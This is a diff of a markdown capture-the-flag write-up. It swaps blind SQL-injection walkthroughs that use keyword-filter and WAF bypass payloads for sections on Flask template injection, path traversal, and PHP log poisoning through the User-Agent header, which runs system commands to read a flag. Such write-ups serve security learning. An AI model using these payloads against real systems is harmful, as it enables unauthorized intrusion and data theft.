@@ -31,70 +31,64 @@ After downloading the files' challenge locally , I found query of input
 
 ![Screenshot at 2021-11-26 09-53-45](https://user-images.githubusercontent.com/52857059/143547089-f06f8c4b-4749-4c33-9f31-9dc5a7249e64.png)
 
-Let's try injecting pass input with ```html 1' or '1'='1 ```
+Let's try injecting pass input with ``` 1' or '1'='1 ```
 
 ![Screenshot at 2021-11-26 10-01-17](https://user-images.githubusercontent.com/52857059/143547148-b89b03d8-01be-44c9-97ef-8640261a8e0e.png)
 
 
 ## 3- INCEPTION(easy)
+![Screenshot at 2021-11-26 10-04-55](https://user-images.githubusercontent.com/52857059/143547836-fcee23ee-9792-461d-90ca-799a392a5460.png)
 
-if we open 
-```html
-https://ch24.sbug.se/?src (getting ?src from page source)
-```
+After downloading the files' challenge locally ,I noticed The application use template Engine .
+I used template injection in python because the application was made with flask.
 
-![Screenshot at 2021-07-21 12-57-59](https://user-images.githubusercontent.com/52857059/126552622-c5f1a8db-a4ce-4e45-a9b5-3d0d2a742147.png)
+![Screenshot at 2021-11-26 10-07-03](https://user-images.githubusercontent.com/52857059/143549346-bbbcb5dd-9b70-4215-9bec-90de69252b20.png)
 
-```html
-they are BlackList words replace them to space -->  preg_replace("/select|union|from|where/i", "", @$_GET["fname"]);
-```
-I thought it was sqli injection exactly blind sqli because when I injected input no error was appeared 
+I noticed also The flag in the config so the payload is ```{{config.items()}}```
 
-I bypassed these words in blacklist by wrote the same word again in the middle EX: (select ---> selselectect) 
+![Screenshot at 2021-11-26 10-19-37](https://user-images.githubusercontent.com/52857059/143549374-639f8833-23a9-4695-9c45-2b810932b34d.png)
 
-I stared injecting with this payload , I guessed the part of column name 'pass' cause he said in description challenge (find the admin password) 
+HTB{r3s3rv4t1on_t0_h311_1s_a11_s3t!}
 
-```html
-1'+OR+(selselectect+sleep(10)+frofromm+dual+whewherere+(selselectect+table_name+frfromom information_schema.columns+whwhereere+table_schema=database()+and+column_name+like+'%pass%'+limit+0,1)+like+'%%')%23
-```
-By guessing &trying I got columns (passwd , uname , role), table (inception_users)
+## 4- IMF - Landing
+![Screenshot at 2021-11-26 10-22-39](https://user-images.githubusercontent.com/52857059/143550824-7b43ab7e-56f6-47b9-aade-9470983c48de.png)
 
-![Screenshot at 2021-07-21 13-01-52](https://user-images.githubusercontent.com/52857059/126554514-25f916b4-f110-4080-8e24-8baefc5f0677.png)
+let's try path traversal 
 
-![Screenshot at 2021-07-21 13-02-48](https://user-images.githubusercontent.com/52857059/126554656-6954d967-9149-4d0d-a7ec-5b8d32f4b745.png)
+![Screenshot at 2021-11-26 10-23-12](https://user-images.githubusercontent.com/52857059/143551120-363c8368-05e9-407f-8147-b3cab69b1f20.png)
+It works.
 
-now let's see what is in passwd column by this payload :
+I noticed the server is nginx so we could read the access.log ```/var/log/nginx/access.log```
 
-```html
-1'+OR+(+SELselectECT+count(*)+frfromom+inception_users+whwhereere+role=+'admin'+AND+passwd+like+'%')%23
-```
-![Screenshot at 2021-07-21 13-05-22](https://user-images.githubusercontent.com/52857059/126555069-c55458f6-55ec-44b5-84b2-78ba3fe1aad4.png)
+![Screenshot at 2021-11-26 10-25-59](https://user-images.githubusercontent.com/52857059/143551202-38954555-d1cd-452b-818e-2db06bcc1bd4.png)
 
-By guessing &trying I finally got the flag :"D
-![Screenshot at 2021-07-21 13-06-03](https://user-images.githubusercontent.com/52857059/126555257-a0cbdc1e-f163-4621-8688-e77195d6e80d.png)
+I notices the user-agent was printed in access.log
 
-![Screenshot at 2021-07-21 22-53-19](https://user-images.githubusercontent.com/52857059/126559146-3d478da0-4f5a-499b-8063-efa46d01b2ba.png)
+![Screenshot at 2021-11-26 10-38-17](https://user-images.githubusercontent.com/52857059/143551771-872a1ce2-bc54-40b3-bff4-9a29529861a5.png)
 
-## 4- BLACKLIST(medium)
+let's inject the user-agent with php code injection ```<?php system('ls') ?> ```
 
-![Screenshot at 2021-07-21 15-13-53](https://user-images.githubusercontent.com/52857059/126556113-44fabb06-437f-47ce-b03d-f7244d7590e9.png)
+![Screenshot at 2021-11-26 10-28-55](https://user-images.githubusercontent.com/52857059/143551895-9deb0453-0197-4ae3-9255-de6f8cca9fdf.png)
 
-It was the same - inception challenge - But the blacklist was space , i tried (/**/) as space but it was faild .
+![Screenshot at 2021-11-26 10-29-32](https://user-images.githubusercontent.com/52857059/143551935-8d010c3e-b79f-42bf-951b-a7a2ea93acda.png)
 
-finally i found (/* _ */) worked as a space without waf caught it :D 
-the same mechanism again ...
+Let's try ```<?php system('ls ../') ?>```
 
-![Screenshot at 2021-07-21 15-15-04](https://user-images.githubusercontent.com/52857059/126556433-9d813bfc-f7ab-4658-992a-8c9c74f92d16.png)
+![Screenshot at 2021-11-26 10-30-40](https://user-images.githubusercontent.com/52857059/143552105-99f4c676-95a2-4fd3-9c4e-c3210e4d8a64.png)
 
-By guessing &trying I got column (flag), table (blacklist_users)
+![Screenshot at 2021-11-26 10-30-54](https://user-images.githubusercontent.com/52857059/143552132-eaf7f512-6dec-4121-a88f-d662d597ddeb.png)
 
-now let's see what is in flag column by this payload :
-```html
-1'/*_*/or/*_*/(select/*_*/sleep(10)/*_*/from/*_*/dual/*_*/where/*_*/(select/*_*/flag/*_*/from/*_*/blacklist_users)/*_*/like/*_*/'%')%23
-```
-By guessing &trying I finally got the flag :"D
+With ```<?php system('cat ../flag*') ?>``` we can read the flag
 
-![Screenshot at 2021-07-21 15-14-22](https://user-images.githubusercontent.com/52857059/126556925-a5f3f320-25a5-4161-b90a-a288d977200f.png)
+![Screenshot at 2021-11-26 10-31-40](https://user-images.githubusercontent.com/52857059/143552300-c8c42619-690a-4342-a5a0-46181cd2d3fb.png)
+
+![Screenshot at 2021-11-26 10-31-54](https://user-images.githubusercontent.com/52857059/143552310-8137f420-2872-48f9-8254-cdfddc5e1322.png)
+
+
+
+
+
+
 
 ## 5- BUY THE FLAG(easy)
 
